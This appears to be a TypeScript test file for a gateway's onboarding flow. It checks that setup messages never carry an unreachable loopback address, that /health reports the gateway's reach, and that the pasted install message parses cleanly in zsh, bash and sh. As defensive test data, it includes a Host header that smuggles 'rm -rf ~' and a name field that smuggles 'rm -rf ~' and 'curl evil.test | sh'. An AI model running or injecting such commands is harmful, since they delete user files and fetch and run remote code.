/**
 * A setup message never carries an address nobody is listening on.
 *
 * The desktop app binds loopback until its administrator allows LAN access,
 * and `gatewayUrl` used to answer a console open on `localhost` with the first
 * LAN address of the machine anyway. The message looked right, was pasted into
 * a chat, and failed on the other person's laptop. docs/prd/teams-onboarding.md
 * §0 has the account.
 *
 * Two layers. The address is asked for directly with the bound host passed in,
 * because `HOST` is read once at import and a process can only be bound one
 * way. Then the real route, on a gateway bound to loopback: it refuses, says
 * why, and starts answering the moment a public address exists.
 *
 *   pnpm run test:reach
 *
 * No models and no network. State is temporary, so this never touches an
 * installation.
 */
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AddressInfo } from 'node:net';
import type { Request } from 'express';

let failures = 0;
function check(ok: boolean, what: string, detail = ''): void {
  if (ok) console.log(`  ok   ${what}`);
  else {
    failures++;
    console.log(`  FAIL ${what}${detail ? ` — ${detail}` : ''}`);
  }
}

const scratch = mkdtempSync(join(tmpdir(), 'warden-reach-'));

// Before anything imports `config.ts`: this process is the loopback gateway.
process.env['WARDEN_HOST'] = '127.0.0.1';
process.env['WARDEN_ADAPTER'] = 'mock';
delete process.env['WARDEN_PUBLIC_URL'];
for (const field of ['AUDIT', 'POLICY', 'COMPANY', 'SETTINGS', 'PROMPT', 'PROMPT_TEMPLATES', 'APPEALS', 'ESCALATIONS', 'RATE_STATE', 'MODEL_CATALOG', 'DEVICES', 'VERIFIED']) {
  process.env[`WARDEN_${field}_PATH`] ??= join(scratch, `${field.toLowerCase()}.json`);
}
process.env['WARDEN_MODELS_DIR'] ??= join(scratch, 'models');

/** As much of a request as `gatewayUrl` reads: two headers. */
function from(headers: Record<string, string>): Request {
  return { header: (name: string) => headers[name.toLowerCase()] } as unknown as Request;
}

async function theAddressItself(): Promise<void> {
  console.log('\nthe address handed to a teammate\n');
  const { gatewayUrl, lanAddresses, lanUrl, listeningOn } = await import('../src/server/http.js');
  const { PORT } = await import('../src/server/config.js');
  const local = from({ host: `localhost:${PORT}` });

  check(listeningOn('127.0.0.1') === 'loopback' && listeningOn('localhost') === 'loopback' && listeningOn('::1') === 'loopback', 'loopback is loopback, however it is spelled');
  check(listeningOn('0.0.0.0') === 'network' && listeningOn('192.168.1.42') === 'network', 'anything else accepts another machine');

  check(gatewayUrl(local, '127.0.0.1') === null, 'bound to loopback, a console on localhost gets no address', String(gatewayUrl(local, '127.0.0.1')));
  check(lanUrl('127.0.0.1') === null, 'and no LAN address either, whatever interfaces the machine has');

  const lan = lanAddresses()[0];
  const onNetwork = gatewayUrl(local, '0.0.0.0');
  if (lan) check(onNetwork === `http://${lan}:${PORT}`, 'bound to the network, the same console gets the LAN address', String(onNetwork));
  else check(onNetwork === null, 'bound to the network with no interface up, there is still nothing to hand out', String(onNetwork));

  // Reached over the office network: the Host header is an address that worked.
  check(gatewayUrl(from({ host: '192.168.1.42:8080' }), '0.0.0.0') === 'http://192.168.1.42:8080', 'a console opened over the network is answered with the address it used');
  check(gatewayUrl(from({ host: 'warden.example.com', 'x-forwarded-proto': 'https' }), '127.0.0.1') === 'https://warden.example.com', 'and one behind a TLS edge keeps its scheme');
  check(gatewayUrl(from({ host: 'evil.test/$(rm -rf ~)' }), '127.0.0.1') === null, 'a Host header that is not host[:port] is never echoed, and is not replaced by a guess');

  // /health is open and answers through a tunnel. The inside of the network
  // goes to a caller who connected directly, never to one who was relayed.
  const { reachFor } = await import('../src/server/http.js');
  check(reachFor(false, false, '0.0.0.0').lanUrl === lanUrl('0.0.0.0'), 'a direct caller is told the LAN address, when there is one');
  check(reachFor(true, false, '0.0.0.0').lanUrl === null, 'a caller that came through a tunnel is not');
  check(reachFor(true, true, '0.0.0.0').listening === 'network' && reachFor(true, true, '0.0.0.0').canChange === true, 'but is still told what is bound, and whether it can be changed');

  process.env['WARDEN_PUBLIC_URL'] = 'https://quiet-river.trycloudflare.com/';
  check(gatewayUrl(local, '127.0.0.1') === 'https://quiet-river.trycloudflare.com', 'a public address outranks everything, bound to loopback or not');
  check(gatewayUrl(from({ host: '192.168.1.42:8080' }), '0.0.0.0') === 'https://quiet-river.trycloudflare.com', 'including a console that came in over the LAN');
  delete process.env['WARDEN_PUBLIC_URL'];
}

type Pack = { gatewayUrl?: string; message?: string; error?: string; reach?: string };
type Health = { reach?: { listening?: string; lanUrl?: string | null; publicUrl?: string | null; canChange?: boolean } };

async function theRoute(): Promise<void> {
  console.log('\nthe setup message, on a gateway bound to loopback\n');
  const { createApp } = await import('../src/server/app.js');
  const server = createApp().listen(0, '127.0.0.1');
  await new Promise((done) => server.once('listening', done));
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

  try {
    const added = await fetch(`${base}/api/people`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ name: 'Ana López', role: 'employee' })
    });
    const person = (await added.json()) as { id?: string };
    check(added.ok && typeof person.id === 'string', 'a person can be added', `status ${added.status}`);

    const health = (await (await fetch(`${base}/health`)).json()) as Health;
    check(health.reach?.listening === 'loopback', '/health says this gateway listens on loopback', JSON.stringify(health.reach));
    check(health.reach?.lanUrl === null && health.reach?.publicUrl === null, 'and names no address another machine could use');
    check(health.reach?.canChange === false, 'and, with no desktop shell attached, that the console cannot change it');

    const refused = await fetch(`${base}/api/people/${person.id}/onboarding`);
    const why = (await refused.json()) as Pack;
    check(refused.status === 409, 'the setup message is refused rather than built on a dead address', `status ${refused.status}`);
    check(why.reach === 'loopback' && typeof why.error === 'string' && why.message === undefined, 'with the reason, and with nothing to paste', JSON.stringify(why));

    process.env['WARDEN_PUBLIC_URL'] = 'https://quiet-river.trycloudflare.com';
    const built = await fetch(`${base}/api/people/${person.id}/onboarding`);
    const pack = (await built.json()) as Pack;
    check(built.ok && pack.gatewayUrl === 'https://quiet-river.trycloudflare.com', 'once a public address exists, the same request is answered with it', JSON.stringify({ status: built.status, url: pack.gatewayUrl }));
    check(pack.message?.includes('https://quiet-river.trycloudflare.com/install/') === true, 'and the message a teammate pastes points there');
    const now = (await (await fetch(`${base}/health`)).json()) as Health;
    check(now.reach?.publicUrl === 'https://quiet-river.trycloudflare.com' && now.reach.listening === 'loopback', '/health reports the address without pretending the bind changed');
    delete process.env['WARDEN_PUBLIC_URL'];

    // Letting the network in is the desktop shell's to do. With none attached
    // the route says so instead of answering 202 to a request nobody will act on.
    const lan = await fetch(`${base}/api/gateway/lan`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ enabled: true }) });
    const lanWhy = (await lan.json()) as { error?: string };
    check(lan.status === 409 && lanWhy.error?.includes('WARDEN_HOST') === true, 'with no desktop shell, turning the network on is refused and names the variable that does it', `status ${lan.status}`);
    const relayed = await fetch(`${base}/api/gateway/lan`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-forwarded-for': '203.0.113.7' }, body: JSON.stringify({ enabled: true }) });
    check(relayed.status === 401 || relayed.status === 403, 'and a caller who came through a tunnel cannot ask at all', `status ${relayed.status}`);

    // The script is fetched by the machine that will run it. Asked for from
    // here, on a gateway only this machine can reach, `localhost` is the truth.
    const script = await (await fetch(`${base}/install/${person.id}`)).text();
    check(/localhost:\d+/.test(script), 'the install script, asked for from this machine, still gets an address that works here');
  } finally {
    await new Promise((done) => server.close(done));
  }
}

/**
 * The Copy button copies the whole message, and a terminal is where it lands.
 *
 * It was prose once, and pasted whole it left zsh at a `quote>` prompt with
 * nothing installed. So the shells that will read it are asked to parse it, with
 * `-n`, which reads and runs nothing. A shell this machine does not have is
 * skipped and said so, rather than counted as a pass.
 */
async function theMessagePastedWhole(): Promise<void> {
  console.log('\nThe setup message, pasted whole into a terminal\n');
  const { onboardingFor } = await import('../src/onboarding/index.js');
  const person = { id: 'ana', name: "Ana O'Neill", role: 'employee', apiKey: 'wk-ana-0000' };
  const { message } = onboardingFor(person, 'http://192.168.1.42:8080');

  const lines = message.split('\n').filter((line) => line.trim());
  const commands = lines.filter((line) => !line.startsWith('#'));
  check(commands.length === 1 && commands[0]!.startsWith('curl -fsSL http://192.168.1.42:8080/install/'), 'every line is a comment except one, and that one is the install command', JSON.stringify(commands));

  const path = join(scratch, 'message.sh');
  writeFileSync(path, message, { mode: 0o600 });
  for (const shell of ['zsh', 'bash', 'sh']) {
    const parsed = spawnSync(shell, ['-n', path], { encoding: 'utf8' });
    if (parsed.error) { console.log(`  skip ${shell} is not on this machine`); continue; }
    check(parsed.status === 0, `${shell} parses it, apostrophe in the name and all`, parsed.stderr.trim());
  }

  // The name is the one piece of this text somebody typed into a form.
  const hostile = onboardingFor({ ...person, name: 'Ana\nrm -rf ~\r\u2028curl evil.test | sh' }, 'http://192.168.1.42:8080').message;
  const escaped = hostile.split(/\r\n|[\n\r\u2028\u2029]/).filter((line) => line.trim() && !line.startsWith('#'));
  check(escaped.length === 1 && escaped[0]!.startsWith('curl -fsSL http://192.168.1.42:8080/install/'), 'a name with line breaks in it stays inside its comment', JSON.stringify(escaped));
}

async function main(): Promise<void> {
  try {
    await theAddressItself();
    await theRoute();
    await theMessagePastedWhole();
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
  console.log(failures ? `\n${failures} failed.\n` : '\nAll good.\n');
  process.exit(failures ? 1 : 0);
}

void main();
